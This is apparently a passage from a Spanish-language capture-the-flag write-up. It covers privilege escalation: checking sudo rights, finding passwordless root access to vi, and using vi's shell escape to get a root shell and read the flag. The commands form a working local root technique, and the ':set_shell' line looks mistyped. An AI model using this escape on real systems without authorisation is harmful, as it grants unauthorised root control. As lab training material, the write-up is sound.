## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
```

Vemos que podemos lanzar `/usr/bin/vi` como root sin proporcionar contraseña.

Como con vi se puede settear nuevas variables, es muy facil rootear esta maquina

```bash
sudo -u root vi /var/www/html/EEEEEE
:set_shell=/bin/bash
:shell
```

Ya tenemos una consola como root y podemos visualizar la flag
